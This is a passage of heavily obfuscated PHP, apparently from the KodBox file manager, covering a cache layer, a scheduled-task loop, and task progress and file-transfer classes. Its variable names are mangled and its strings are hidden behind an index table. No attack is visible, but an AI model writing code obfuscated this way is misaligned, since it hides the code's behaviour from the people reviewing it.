array_to_keyvalue($½±°¶õÒ, $‚üß‹ö×[12], $‚üß‹ö×[463])); return !1; } private function _fileFilter($’üıåùö) { $ŠÚ­·ùı =& $_SERVER[Ôó‡è­ƒ]; if (empty($’üıåùö)) { return; } $ï•¤·¦ç = array($ŠÚ­·ùı[463] => array($ŠÚ­·ùı[7], array_unique($’üıåùö))); $ÛñÒ®£ = Model($ŠÚ­·ùı[823])->where($ï•¤·¦ç)->field($ŠÚ­·ùı[399])->select(); foreach ($ÛñÒ®£ as $âç¡¾Ôù) { Model($ŠÚ­·ùı[823])->remove($âç¡¾Ôù[$ŠÚ­·ùı[399]], !1); } } private function storeIds() { $ÑèÄ¤ºˆ =& $_SERVER[Ôó‡è­ƒ]; $ ¸Ï”ùƒ = Model($ÑèÄ¤ºˆ[765])->listData(); $ƒŞÒãµÂ = array(); $Ğš©¯Î = $GLOBALS[$ÑèÄ¤ºˆ[6]][$ÑèÄ¤ºˆ[90]][$ÑèÄ¤ºˆ[824]]; foreach ($ ¸Ï”ùƒ as $ÚæšÛë¢) { $”ĞğÏø¢ = strtolower($ÚæšÛë¢[$ÑèÄ¤ºˆ[96]]); if (!isset($Ğš©¯Î[$”ĞğÏø¢])) { continue; } $ø‚•»Â = $ÑèÄ¤ºˆ[74] . (isset($Ğš©¯Î[$”ĞğÏø¢]) ? $Ğš©¯Î[$”ĞğÏø¢] : ucfirst($”ĞğÏø¢)); if (!class_exists($ø‚•»Â)) { continue; } $ƒŞÒãµÂ[] = $ÚæšÛë¢[$ÑèÄ¤ºˆ[396]]; } return $ƒŞÒãµÂ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $‚¡ÏÖÉÜ =& $_SERVER[Ôó‡è­ƒ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $±­Â–‘ = $GLOBALS[$‚¡ÏÖÉÜ[6]][$‚¡ÏÖÉÜ[348]]; $âñçáİ¬ = $±­Â–‘[$±­Â–‘[$‚¡ÏÖÉÜ[825]]]; $«ıî‚û = $±­Â–‘[$‚¡ÏÖÉÜ[826]]; switch ($±­Â–‘[$‚¡ÏÖÉÜ[825]]) { case $‚¡ÏÖÉÜ[21]: self::$handle = Model($‚¡ÏÖÉÜ[827]); break; case $‚¡ÏÖÉÜ[828]: self::$handle = new CacheRedis($âñçáİ¬, $«ıî‚û); break; case $‚¡ÏÖÉÜ[829]: self::$handle = new CacheMemcached($âñçáİ¬, $«ıî‚û); break; case $‚¡ÏÖÉÜ[196]: self::$handle = new CacheFile($âñçáİ¬, $«ıî‚û); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($§–‡ñˆØ) { if (is_array($§–‡ñˆØ) || is_object($§–‡ñˆØ)) { $§–‡ñˆØ = json_encode($§–‡ñˆØ); } $§–‡ñˆØ = rawurlencode($§–‡ñˆØ); return md5(KOD_SITE_ID . $_SERVER[Ôó‡è­ƒ][11] . $§–‡ñˆØ); } public static function get($’˜äá‹ˆ, $ì·‡—° = false) { $Ş–ï«èÍ = self::key($’˜äá‹ˆ); if ($ì·‡—°) { return unserialize(self::init()->get($Ş–ï«èÍ)); } if (!isset(self::$memoryCache[$Ş–ï«èÍ])) { $‚¼àÄÈ = self::init()->get($Ş–ï«èÍ); self::$memoryCache[$Ş–ï«èÍ] = unserialize($‚¼àÄÈ); } return self::$memoryCache[$Ş–ï«èÍ]; } public static function set($ÚØ¼›», $Éš¦çó§, $µÛºÍ•™ = false) { $—¥«•µ‹ = self::key($ÚØ¼›»); if (isset(self::$memoryCache[$—¥«•µ‹]) && self::$memoryCache[$—¥«•µ‹] === $Éš¦çó§) { return !0; } if ($µÛºÍ•™ === 0) { self::$memoryCache[$—¥«•µ‹] = $Éš¦çó§; return !0; } CacheLock::lock($ÚØ¼›»); $¼“ÛÂÙÍ = self::init()->set($—¥«•µ‹, serialize($Éš¦çó§), $µÛºÍ•™); self::$memoryCache[$—¥«•µ‹] = $Éš¦çó§; CacheLock::unlock($ÚØ¼›»); return $¼“ÛÂÙÍ; } public static function getCall($¢º®ÂíÅ, $ı“şæÈ, $Ô«Óë, $Ù•¹š‹¿ = array()) { $ »Ãƒ’ç =& $_SERVER[Ôó‡è­ƒ]; $ğî§©±á = self::get($¢º®ÂíÅ); if ($ğî§©±á || $ğî§©±á === $ »Ãƒ’ç[12]) { return $ğî§©±á; } $ğî§©±á = call_user_func_array($Ô«Óë, $Ù•¹š‹¿); $ğî§©±á = $ğî§©±á ? $ğî§©±á : $ »Ãƒ’ç[12]; self::set($¢º®ÂíÅ, $ğî§©±á, $ı“şæÈ); return $ğî§©±á; } public static function remove($Ë—ÆŒ‚) { $ù‰—ö¥ƒ = self::key($Ë—ÆŒ‚); unset(self::$memoryCache[$ù‰—ö¥ƒ]); self::clearTimeout(); CacheLock::lock($Ë—ÆŒ‚); $Š„ÔÕàŠ = self::init()->remove($ù‰—ö¥ƒ); CacheLock::unlock($Ë—ÆŒ‚); return $Š„ÔÕàŠ; } public static function removeMemory($é€º÷±Ù) { $¿º‡æÅù = self::key($é€º÷±Ù); unset(self::$memoryCache[$¿º‡æÅù]); } public static function clearMemory($ß¢èİ”á = false) { if ($ß¢èİ”á) { $ß¢èİ”á = self::key($ß¢èİ”á); unset(self::$memoryCache[$ß¢èİ”á]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ôó‡è­ƒ][830])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ôó‡è­ƒ][831])) { self::init()->clearTimeout(); } } } goto bğ”ùõÛª“; B¹Ñ‘âÚ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ï…¡Â§Ê =& $_SERVER[Ôó‡è­ƒ]; if (self::valueGet($Ï…¡Â§Ê[748]) != $Ï…¡Â§Ê[89]) { return; } if (self::valueGet($Ï…¡Â§Ê[1615]) == $Ï…¡Â§Ê[89]) { $Áìê‹Æ÷ = self::valueGet($Ï…¡Â§Ê[1616]); if (time() - $Áìê‹Æ÷ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($Ï…¡Â§Ê[1615], $Ï…¡Â§Ê[89]); self::log($Ï…¡Â§Ê[1617]); Hook::bind($Ï…¡Â§Ê[1618], $Ï…¡Â§Ê[1619]); $Àô˜›ï¨ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ï…¡Â§Ê[748]) != $Ï…¡Â§Ê[89]) { self::valueSet($Ï…¡Â§Ê[1615], $Ï…¡Â§Ê[194]); self::log($Ï…¡Â§Ê[1620]); die; } $¯é­×§û = time(); if ($¯é­×§û - $Àô˜›ï¨ >= 60) { self::valueSet(array($Ï…¡Â§Ê[1615] => $Ï…¡Â§Ê[89], $Ï…¡Â§Ê[1616] => $¯é­×§û), !1); $Àô˜›ï¨ = $¯é­×§û; } if (!file_exists(USER_SYSTEM . $Ï…¡Â§Ê[1621])) { self::valueSet(array($Ï…¡Â§Ê[1615] => $Ï…¡Â§Ê[194], $Ï…¡Â§Ê[748] => $Ï…¡Â§Ê[194]), !1); self::log($Ï…¡Â§Ê[1622]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ÙˆÍáãÛ =& $_SERVER[Ôó‡è­ƒ]; http_close(); self::valueSet($ÙˆÍáãÛ[748], $ÙˆÍáãÛ[194]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÙˆÍáãÛ[1615] => $ÙˆÍáãÛ[194], $ÙˆÍáãÛ[748] => $ÙˆÍáãÛ[89]), !1); } public static function shutdownEvent() { $«ÅäÅ×ø =& $_SERVER[Ôó‡è­ƒ]; self::valueSet($«ÅäÅ×ø[1615], $«ÅäÅ×ø[194]); self::log($«ÅäÅ×ø[1623]); } public static function config($÷Î™æ›ş, $‹ëµÊÈ) { self::valueSet($_SERVER[Ôó‡è­ƒ][748], $÷Î™æ›ş); } private static function taskRunAll() { $Á£Ìë³ =& $_SERVER[Ôó‡è­ƒ]; $ûêÉĞìî = timeFloat(); $š§¢³Ù± = Model($Á£Ìë³[1624])->listData(); $ÁÆ‹æŞŞ = count($š§¢³Ù±); for ($£‡ö™ƒé = 0; $£‡ö™ƒé < $ÁÆ‹æŞŞ; $£‡ö™ƒé++) { $Ü˜×­¨ˆ = $š§¢³Ù±[$£‡ö™ƒé]; if (!$Ü˜×­¨ˆ[$Á£Ìë³[396]] || $Ü˜×­¨ˆ[$Á£Ìë³[1625]] != $Á£Ìë³[89]) { continue; } if (!self::taskTimeCheck($Ü˜×­¨ˆ)) { continue; } self::taskRun($Ü˜×­¨ˆ); } Hook::trigger($Á£Ìë³[1626]); self::taskQueueRun($ûêÉĞìî); } private static function taskQueueRun($îøõÎÖœ) { $ãÕÚ¥ = 10; while (!0) { $Ü¿’ò™® = TaskQueue::run(); if ($Ü¿’ò™® === !1) { break; } if (timeFloat() - $îøõÎÖœ >= $ãÕÚ¥) { break; } } } private static function taskTimeCheck($—÷›ßÏ) { $¾±˜‘µ× =& $_SERVER[Ôó‡è­ƒ]; $®í¤à¾ = json_decode($—÷›ßÏ[$¾±˜‘µ×[200]], !0); $º Õê¼õ = intval($—÷›ßÏ[$¾±˜‘µ×[1616]]); $ ·£ğ÷ø = strtotime($¾±˜‘µ×[1627] . $®í¤à¾[$¾±˜‘µ×[1628]] . $¾±˜‘µ×[1629]) - strtotime($¾±˜‘µ×[1630]); $«Ì£½·ñ = time() - strtotime(date($¾±˜‘µ×[1631]) . $¾±˜‘µ×[1632]); $¿ı²Ç¢ = $«Ì£½·ñ >= $ ·£ğ÷ø && $«Ì£½·ñ <= $ ·£ğ÷ø + 3600; switch ($®í¤à¾[$¾±˜‘µ×[33]]) { case $¾±˜‘µ×[1633]: if (time() - $º Õê¼õ < 3600 * 24 * 30) { return !1; } if ($®í¤à¾[$¾±˜‘µ×[1633]] == date($¾±˜‘µ×[1634]) && $¿ı²Ç¢) { return !0; } break; case $¾±˜‘µ×[1635]: if (time() - $º Õê¼õ < 3600 * 24 * 7) { return !1; } $Ãú˜Ïñ = date($¾±˜‘µ×[1636]) == 0 ? 7 : date($¾±˜‘µ×[1636]); if ($®í¤à¾[$¾±˜‘µ×[1635]] == $Ãú˜Ïñ && $¿ı²Ç¢) { return !0; } break; case $¾±˜‘µ×[1628]: if (time() - $º Õê¼õ < 3600 * 24) { return !1; } if ($¿ı²Ç¢) { return !0; } break; case $¾±˜‘µ×[1637]: if (time() - $º Õê¼õ >= floatval($®í¤à¾[$¾±˜‘µ×[1637]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ƒÑ®ÆÎ¡ =& $_SERVER[Ôó‡è­ƒ]; static $«šá¼¡ = 0; $Áƒ•ÆŸ² = 300; if (!$«šá¼¡) { $«šá¼¡ = time(); } if (time() - $«šá¼¡ < $Áƒ•ÆŸ²) { return; } $«šá¼¡ = time(); $›Š¤©ä» = Model($ƒÑ®ÆÎ¡[509])->db($ƒÑ®ÆÎ¡[12]); if ($›Š¤©ä») { $›Š¤©ä»->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ƒÑ®ÆÎ¡[1638], $ƒÑ®ÆÎ¡[1639]); die; } } public static function taskRun($¾ãò¬Œ¾) { $ÊÉ‡ÅµÁ =& $_SERVER[Ôó‡è­ƒ]; self::log($ÊÉ‡ÅµÁ[1640] . $¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[396]] . $ÊÉ‡ÅµÁ[1641] . $¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[32]] . $ÊÉ‡ÅµÁ[1642] . $¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[1643]]); Model($ÊÉ‡ÅµÁ[1624])->run($¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[396]]); $óİ ÄÖ‘ = timeFloat(); $‰Òåæ“ = $ÊÉ‡ÅµÁ[12]; switch ($¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[33]]) { case $ÊÉ‡ÅµÁ[306]: $‰Üä¹ÏÊ = url_request($¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[1643]], $ÊÉ‡ÅµÁ[229], !1, !1, !1, !1, 10); if ($‰Üä¹ÏÊ[$ÊÉ‡ÅµÁ[748]]) { $‰Òåæ“ = strlen($‰Üä¹ÏÊ[$ÊÉ‡ÅµÁ[1191]]); } break; case $ÊÉ‡ÅµÁ[228]: $‰Òåæ“ = Hook::apply($¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[1643]]); default: break; } Model($ÊÉ‡ÅµÁ[1644])->add(array($ÊÉ‡ÅµÁ[1645] => $ÊÉ‡ÅµÁ[12], $ÊÉ‡ÅµÁ[1646] => $ÊÉ‡ÅµÁ[194], $ÊÉ‡ÅµÁ[33] => $ÊÉ‡ÅµÁ[1647] . $¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[396]], $ÊÉ‡ÅµÁ[1648] => json_encode(array($ÊÉ‡ÅµÁ[32] => $¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[32]], $ÊÉ‡ÅµÁ[1649] => timeFloat() - $óİ ÄÖ‘, $ÊÉ‡ÅµÁ[292] => $‰Òåæ“)))); $ÛÍšü½ = $‰Òåæ“ ? $ÊÉ‡ÅµÁ[1650] . $‰Òåæ“ : $ÊÉ‡ÅµÁ[12]; self::log($ÊÉ‡ÅµÁ[1651] . $¾ãò¬Œ¾[$ÊÉ‡ÅµÁ[396]] . $ÊÉ‡ÅµÁ[532] . $ÛÍšü½); return !0; } private static function valueGet($ª·ïñ–”) { $œ–¼¹…à =& $_SERVER[Ôó‡è­ƒ]; $·“ˆÀ³æ = $œ–¼¹…à[1652]; $è³¯‰¸ß = Model($œ–¼¹…à[429])->get($ª·ïñ–”, $·“ˆÀ³æ); if (is_null($è³¯‰¸ß)) { Model($œ–¼¹…à[429])->set($œ–¼¹…à[748], $œ–¼¹…à[89], $·“ˆÀ³æ); Model($œ–¼¹…à[429])->set($œ–¼¹…à[1615], $œ–¼¹…à[194], $·“ˆÀ³æ); $è³¯‰¸ß = Model($œ–¼¹…à[429])->get($ª·ïñ–”, $·“ˆÀ³æ); } return $è³¯‰¸ß; } private static function valueSet($ŒŒŞ´¡¿, $¸¼†³) { $ÚòÏ«÷ =& $_SERVER[Ôó‡è­ƒ]; $ğğ²æ¿ğ = $ÚòÏ«÷[1653]; CacheLock::lock($ğğ²æ¿ğ); $¦ÅìÎ»¾ = Model($ÚòÏ«÷[429])->set($ŒŒŞ´¡¿, $¸¼†³, $ÚòÏ«÷[1652]); CacheLock::unlock($ğğ²æ¿ğ); return $¦ÅìÎ»¾; } protected static function log($ÏµÀÑ®Œ) { write_log($ÏµÀÑ®Œ, $_SERVER[Ôó‡è­ƒ][1639]); } private static function cacheClear() { $¨ÃŸ¹ =& $_SERVER[Ôó‡è­ƒ]; Cache::clearMemory(Model($¨ÃŸ¹[429])->cacheKey($¨ÃŸ¹[1652])); Cache::clearMemory(Model($¨ÃŸ¹[429])->cacheKey($¨ÃŸ¹[1654])); Model($¨ÃŸ¹[1624])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\162\165\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($Ÿ¨•™Ô, $öµÍ”ÄÂ = '', $É»ç® = 0, $­Æ’üû£ = '') { $âÄ¾ëÍ” =& $_SERVER[Ôó‡è­ƒ]; if (self::get($Ÿ¨•™Ô)) { return; } $this->task = array($âÄ¾ëÍ”[396] => $Ÿ¨•™Ô, $âÄ¾ëÍ”[1655] => USER_ID, $âÄ¾ëÍ”[1555] => $­Æ’üû£, $âÄ¾ëÍ”[33] => $öµÍ”ÄÂ, $âÄ¾ëÍ”[1064] => $âÄ¾ëÍ”[12], $âÄ¾ëÍ”[784] => $É»ç®, $âÄ¾ëÍ”[1656] => 0, $âÄ¾ëÍ”[1657] => 0, $âÄ¾ëÍ”[1658] => 0, $âÄ¾ëÍ”[1659] => timeFloat(), $âÄ¾ëÍ”[1660] => 0, $âÄ¾ëÍ”[1661] => 0, $âÄ¾ëÍ”[1662] => 0, $âÄ¾ëÍ”[1663] => 0, $âÄ¾ëÍ”[748] => $âÄ¾ëÍ”[1615]); $GLOBALS[$âÄ¾ëÍ”[1664]] = 1; Hook::bind($âÄ¾ëÍ”[1618], array($this, $âÄ¾ëÍ”[1665])); Hook::bind($âÄ¾ëÍ”[1666], array($this, $âÄ¾ëÍ”[1667])); $this->startAfter(); Hook::trigger($âÄ¾ëÍ”[1668], $this->task); $this->task[$âÄ¾ëÍ”[1661]] = timeFloat(); } public function end() { $²Ğë×ÑÚ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->task) { return; } if ($this->task[$²Ğë×ÑÚ[1661]]) { self::valueSet($this->task[$²Ğë×ÑÚ[396]], !1); } $µ€¹åÈ³ = timeFloat() - $this->task[$²Ğë×ÑÚ[1659]]; self::log($²Ğë×ÑÚ[1669] . $this->task[$²Ğë×ÑÚ[396]] . $²Ğë×ÑÚ[1670] . $µ€¹åÈ³ . $²Ğë×ÑÚ[1671]); Hook::unbind($²Ğë×ÑÚ[1618], array($this, $²Ğë×ÑÚ[1665])); Hook::unbind($²Ğë×ÑÚ[1666], array($this, $²Ğë×ÑÚ[1667])); $this->endAfter(); $this->task = !1; } public function update($íƒµ­Á¤ = 0, $ÈÑ÷—³° = false) { $âş¤ø›µ =& $_SERVER[Ôó‡è­ƒ]; $ß©¥™Ã =& $this->task; if (!$ß©¥™Ã) { return; } $ß©¥™Ã[$âş¤ø›µ[1656]] += $íƒµ­Á¤; $ß©¥™Ã[$âş¤ø›µ[1660]] = timeFloat(); if ($ß©¥™Ã[$âş¤ø›µ[784]]) { if ($ß©¥™Ã[$âş¤ø›µ[784]] < $ß©¥™Ã[$âş¤ø›µ[1656]]) { $ß©¥™Ã[$âş¤ø›µ[784]] = $ß©¥™Ã[$âş¤ø›µ[1656]]; } $©ÌÀ†Å = timeFloat() - $ß©¥™Ã[$âş¤ø›µ[1659]] - $ß©¥™Ã[$âş¤ø›µ[1662]]; if ($©ÌÀ†Å <= 0) { $©ÌÀ†Å = 0.001; } $ß©¥™Ã[$âş¤ø›µ[1657]] = $ß©¥™Ã[$âş¤ø›µ[1656]] / $ß©¥™Ã[$âş¤ø›µ[784]]; $ß©¥™Ã[$âş¤ø›µ[1658]] = $ß©¥™Ã[$âş¤ø›µ[1656]] / $©ÌÀ†Å; if ($ß©¥™Ã[$âş¤ø›µ[1657]] > 0) { $ß©¥™Ã[$âş¤ø›µ[1663]] = $©ÌÀ†Å * (1 - $ß©¥™Ã[$âş¤ø›µ[1657]]) / $ß©¥™Ã[$âş¤ø›µ[1657]]; } $ß©¥™Ã[$âş¤ø›µ[1663]] = $ß©¥™Ã[$âş¤ø›µ[1663]] <= 0 ? 0 : $ß©¥™Ã[$âş¤ø›µ[1663]]; } $this->updateAfter(); $ÕªÙğ—á = 0.2; if (timeFloat() - $ß©¥™Ã[$âş¤ø›µ[1661]] < $ÕªÙğ—á && !$ÈÑ÷—³°) { return; } $¹Ó€Ä®· = self::get($ß©¥™Ã[$âş¤ø›µ[396]]); $§òèàÊú = $¹Ó€Ä®·[$âş¤ø›µ[748]]; if ($§òèàÊú == self::STATYS_KILL) { $ŞäÛ²É¢ = array($âş¤ø›µ[1672] => LNG($âş¤ø›µ[1673]), $âş¤ø›µ[1189] => !1); Cache::set($âş¤ø›µ[1674] . $this->task[$âş¤ø›µ[396]], $ŞäÛ²É¢, 30); $this->onKill(); $this->end(); die; } else { if ($§òèàÊú == self::STATYS_STOP) { $¿ñâÁã€ = 2; $¹Ó€Ä®·[$âş¤ø›µ[1662]] += $¿ñâÁã€; self::valueSet($ß©¥™Ã[$âş¤ø›µ[396]], $¹Ó€Ä®·); sleep($¿ñâÁã€); $this->update(); return; } } $ß©¥™Ã[$âş¤ø›µ[748]] = $§òèàÊú ? $§òèàÊú : $ß©¥™Ã[$âş¤ø›µ[748]]; $ß©¥™Ã[$âş¤ø›µ[1662]] = $¹Ó€Ä®·[$âş¤ø›µ[1662]] ? $¹Ó€Ä®·[$âş¤ø›µ[1662]] : 0; $ß©¥™Ã[$âş¤ø›µ[1661]] = timeFloat(); Hook::trigger($âş¤ø›µ[1675], $ß©¥™Ã); self::valueSet($ß©¥™Ã[$âş¤ø›µ[396]], $ß©¥™Ã); } public function onKillSet($ıê£Í²š, $†ç¤ØÙ¼ = array()) { $this->onKillCall = array($ıê£Í²š, $†ç¤ØÙ¼); } public function onKill() { $Åß×ÜÉ¨ =& $_SERVER[Ôó‡è­ƒ]; self::log($Åß×ÜÉ¨[1669] . $this->task[$Åß×ÜÉ¨[396]] . $Åß×ÜÉ¨[1676]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¿©ÀÈ‚) { $ûĞ³¬ =& $_SERVER[Ôó‡è­ƒ]; Cache::set($ûĞ³¬[1674] . $this->task[$ûĞ³¬[396]], $¿©ÀÈ‚, 60); return $¿©ÀÈ‚; } public static function get($¢¶ãŒÆñ) { $ˆ¯úîÄ =& $_SERVER[Ôó‡è­ƒ]; $Ã¼Ì‘ØŸ = self::valueGet($¢¶ãŒÆñ); if (is_array($Ã¼Ì‘ØŸ) && $Ã¼Ì‘ØŸ[$ˆ¯úîÄ[1677]]) { $ÕÀè±æĞ = ActionApply($Ã¼Ì‘ØŸ[$ˆ¯úîÄ[1677]], array($Ã¼Ì‘ØŸ)); $Ã¼Ì‘ØŸ = is_array($ÕÀè±æĞ) ? $ÕÀè±æĞ : $Ã¼Ì‘ØŸ; } return $Ã¼Ì‘ØŸ; } public static function listData() { $ÆÇˆëâÏ = self::valueGet(); return array_sort_by($ÆÇˆëâÏ, $_SERVER[Ôó‡è­ƒ][1659], !0); } public static function kill($ÁßéÁÜé) { return self::changeStatus($ÁßéÁÜé, self::STATYS_KILL); } public static function stop($«§¬üÖ) { return self::changeStatus($«§¬üÖ, self::STATYS_STOP); } public static function restart($³¦ñÈàê) { return self::changeStatus($³¦ñÈàê, self::STATYS_RUNNING); } public static function killAll() { $´ÀÓ·… =& $_SERVER[Ôó‡è­ƒ]; $¢ÀşêÀ° = self::listData(); foreach ($¢ÀşêÀ° as $¶ÂİÕºÓ) { self::kill($¶ÂİÕºÓ[$´ÀÓ·…[396]]); } sleep(2); foreach ($¢ÀşêÀ° as $¶ÂİÕºÓ) { self::valueSet($¶ÂİÕºÓ[$´ÀÓ·…[396]], !1); } } private static function changeStatus($²Õà‘ş¹, $×éÃêŞ») { $Şä‹ˆé =& $_SERVER[Ôó‡è­ƒ]; $—ØÂÒğ = self::valueGet($²Õà‘ş¹); if (!$—ØÂÒğ) { return !1; } $—ØÂÒğ[$Şä‹ˆé[748]] = $×éÃêŞ»; self::valueSet($²Õà‘ş¹, $—ØÂÒğ); self::log($Şä‹ˆé[1678] . $—ØÂÒğ[$Şä‹ˆé[396]] . $Şä‹ˆé[1679] . $×éÃêŞ»); return !0; } public static function valueGet($ûèîÁç = false) { $¢¤ØÇŞ¹ =& $_SERVER[Ôó‡è­ƒ]; if ($ûèîÁç) { $Âºæ½î€ = Model($¢¤ØÇŞ¹[441])->where(array($¢¤ØÇŞ¹[95] => $ûèîÁç, $¢¤ØÇŞ¹[33] => $¢¤ØÇŞ¹[1071]))->find(); return $Âºæ½î€ ? json_decode($Âºæ½î€[$¢¤ØÇŞ¹[373]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($†íŞñƒ§ = false) { $à˜ÀòÖñ =& $_SERVER[Ôó‡è­ƒ]; $Ú¸Ì¨À = array($à˜ÀòÖñ[33] => $à˜ÀòÖñ[1071]); if ($†íŞñƒ§) { $Ú¸Ì¨À[$à˜ÀòÖñ[1655]] = $†íŞñƒ§; } $ì³¿ÓŠÖ = Model($à˜ÀòÖñ[441])->where($Ú¸Ì¨À)->select(); $ì³¿ÓŠÖ = $ì³¿ÓŠÖ ? $ì³¿ÓŠÖ : array(); foreach ($ì³¿ÓŠÖ as $Ÿ‘ò€Ÿ² => $¨¯àÄ“‹) { $ì³¿ÓŠÖ[$Ÿ‘ò€Ÿ²] = json_decode($¨¯àÄ“‹[$à˜ÀòÖñ[373]], !0); } return $ì³¿ÓŠÖ; } public static function valueSet($ç€¢‰ÚÔ, $Ñ¥Ë‘Õğ) { $ƒ³°ŒÉš =& $_SERVER[Ôó‡è­ƒ]; if (!$Ñ¥Ë‘Õğ) { return Model($ƒ³°ŒÉš[441])->where(array($ƒ³°ŒÉš[95] => $ç€¢‰ÚÔ, $ƒ³°ŒÉš[33] => $ƒ³°ŒÉš[1071]))->delete(); } $Æ¦½´ê‘ = json_encode($Ñ¥Ë‘Õğ); if (!$Æ¦½´ê‘) { ob_start(); var_dump($Ñ¥Ë‘Õğ); $êÄàâÓğ = ob_get_clean(); self::log($ƒ³°ŒÉš[1680] . json_encode_force($êÄàâÓğ)); } if (!$ç€¢‰ÚÔ || !$Ñ¥Ë‘Õğ[$ƒ³°ŒÉš[396]]) { return !1; } $ °¤ø›Â = array($ƒ³°ŒÉš[33] => $ƒ³°ŒÉš[1071], $ƒ³°ŒÉš[1655] => USER_ID, $ƒ³°ŒÉš[95] => $ç€¢‰ÚÔ, $ƒ³°ŒÉš[373] => $Æ¦½´ê‘); $‡±¢±øæ = $ƒ³°ŒÉš[1681]; CacheLock::lock($‡±¢±øæ); Model($ƒ³°ŒÉš[441])->add($ °¤ø›Â, array(), !0); CacheLock::unlock($‡±¢±øæ); } public static function log($Ìşæ‘Ëˆ) { if (!GLOBAL_DEBUG) { return; } write_log($Ìşæ‘Ëˆ, $_SERVER[Ôó‡è­ƒ][1682]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ğ˜ì”ê =& $_SERVER[Ôó‡è­ƒ]; $ƒ ÒªÔõ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ğ˜ì”ê[1683], array($this, $ğ˜ì”ê[1684])); Hook::bind($ğ˜ì”ê[1213], array($this, $ğ˜ì”ê[1685])); Hook::bind($ğ˜ì”ê[1686], array($this, $ğ˜ì”ê[1687])); Hook::bind($ğ˜ì”ê[597], array($this, $ğ˜ì”ê[1688])); Hook::bind($ğ˜ì”ê[598], array($this, $ğ˜ì”ê[1689])); Hook::bind($ğ˜ì”ê[600], array($this, $ğ˜ì”ê[1690])); Hook::bind($ğ˜ì”ê[601], array($this, $ğ˜ì”ê[1690])); Hook::bind($ğ˜ì”ê[567], array($this, $ğ˜ì”ê[1691])); Hook::bind($ğ˜ì”ê[564], array($this, $ğ˜ì”ê[1691])); Hook::bind($ğ˜ì”ê[569], array($this, $ğ˜ì”ê[1691])); Hook::bind($ğ˜ì”ê[571], array($this, $ğ˜ì”ê[1691])); Hook::bind($ğ˜ì”ê[573], array($this, $ğ˜ì”ê[1691])); Hook::bind($ğ˜ì”ê[1692], array($this, $ğ˜ì”ê[1693])); Hook::bind($ğ˜ì”ê[590], array($this, $ğ˜ì”ê[1694])); $this->sourceModelCopyFlag = !1; Hook::bind($ğ˜ì”ê[1695], array($this, $ğ˜ì”ê[1696])); Hook::bind($ğ˜ì”ê[1697], array($this, $ğ˜ì”ê[1698])); Hook::bind($ğ˜ì”ê[1699], array($this, $ğ˜ì”ê[1700])); $ƒ ÒªÔõ[$ğ˜ì”ê[1701]] = LNG($ğ˜ì”ê[1702]); $ƒ ÒªÔõ[$ğ˜ì”ê[1703]] = 0; $ƒ ÒªÔõ[$ğ˜ì”ê[1704]] = 0; $ƒ ÒªÔõ[$ğ˜ì”ê[1064]] = $ğ˜ì”ê[12]; $ƒ ÒªÔõ[$ğ˜ì”ê[1705]] = $ğ˜ì”ê[12]; $ƒ ÒªÔõ[$ğ˜ì”ê[1706]] = 0; $ƒ ÒªÔõ[$ğ˜ì”ê[1707]] = 0; $ƒ ÒªÔõ[$ğ˜ì”ê[1708]] = 0; if (!$ƒ ÒªÔõ[$ğ˜ì”ê[1555]]) { $ƒ ÒªÔõ[$ğ˜ì”ê[1555]] = LNG($ğ˜ì”ê[1709]); } } protected function endAfter() { $˜Ø›°ã¹ =& $_SERVER[Ôó‡è­ƒ]; Hook::unbind($˜Ø›°ã¹[1683], array($this, $˜Ø›°ã¹[1684])); Hook::unbind($˜Ø›°ã¹[1213], array($this, $˜Ø›°ã¹[1685])); Hook::unbind($˜Ø›°ã¹[1686], array($this, $˜Ø›°ã¹[1687])); Hook::unbind($˜Ø›°ã¹[597], array($this, $˜Ø›°ã¹[1688])); Hook::unbind($˜Ø›°ã¹[598], array($this, $˜Ø›°ã¹[1689])); Hook::unbind($˜Ø›°ã¹[600], array($this, $˜Ø›°ã¹[1690])); Hook::unbind($˜Ø›°ã¹[601], array($this, $˜Ø›°ã¹[1690])); Hook::unbind($˜Ø›°ã¹[567], array($this, $˜Ø›°ã¹[1691])); Hook::unbind($˜Ø›°ã¹[564], array($this, $˜Ø›°ã¹[1691])); Hook::unbind($˜Ø›°ã¹[569], array($this, $˜Ø›°ã¹[1691])); Hook::unbind($˜Ø›°ã¹[571], array($this, $˜Ø›°ã¹[1691])); Hook::unbind($˜Ø›°ã¹[573], array($this, $˜Ø›°ã¹[1691])); Hook::unbind($˜Ø›°ã¹[1692], array($this, $˜Ø›°ã¹[1693])); Hook::unbind($˜Ø›°ã¹[590], array($this, $˜Ø›°ã¹[1694])); 